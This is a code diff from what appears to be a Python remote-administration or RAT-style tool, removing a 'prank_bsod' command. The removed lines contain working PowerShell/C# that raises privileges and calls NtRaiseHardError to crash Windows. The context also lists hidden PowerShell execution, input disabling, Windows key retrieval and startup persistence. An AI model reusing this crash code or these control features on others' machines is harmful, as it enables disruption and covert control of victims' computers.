@@ -1425,16 +1425,6 @@ async def cmd_prank_update(p):
     subprocess.Popen(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",script])
     return "Prank sent"
 
-async def cmd_prank_bsod(p):
-    if not IS_WIN: return "Windows only"
-    script = r"""Add-Type -TypeDefinition @"
-using System;using System.Runtime.InteropServices;
-public class B{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool t,ref bool prev);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint ec,uint n,uint u,IntPtr p,uint f,ref uint r);public static void Go(){bool prev=false;uint r=0;RtlAdjustPrivilege(19,true,false,ref prev);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,ref r);}}
-"@
-[B]::Go()"""
-    subprocess.Popen(["powershell","-NoProfile","-WindowStyle","Hidden","-Command",script])
-    return "BSOD initiated"
-
 # 17. CONFIG
 async def cmd_show_config(p):
     safe = {k:("***" if "key" in k or "secret" in k else v) for k,v in CFG.items()}
@@ -1578,7 +1568,7 @@ APPS        : open_app, open_url, close_app, list_windows, show_desktop,
 CONTROL     : disable_input, set_wallpaper, set_resolution
 ADVANCED    : registry_read, get_windows_key, empty_recycle
 STARTUP     : add_startup, remove_startup
-PRANKS      : prank_update, prank_bsod
+PRANKS      : prank_update
 CONFIG      : show_config, update_server, update_name, update_secret
 UPDATE      : version, check_update, restart_update
 VOICE       : voice_mics, voice_test  (настройки в config.json -> voice)
@@ -1671,7 +1661,6 @@ COMMANDS = {
     "add_startup":       cmd_add_startup,
     "remove_startup":    cmd_remove_startup,
     "prank_update":      cmd_prank_update,
-    "prank_bsod":        cmd_prank_bsod,
     "show_config":       cmd_show_config,
     "update_server":     cmd_update_server,
     "update_name":       cmd_update_name,
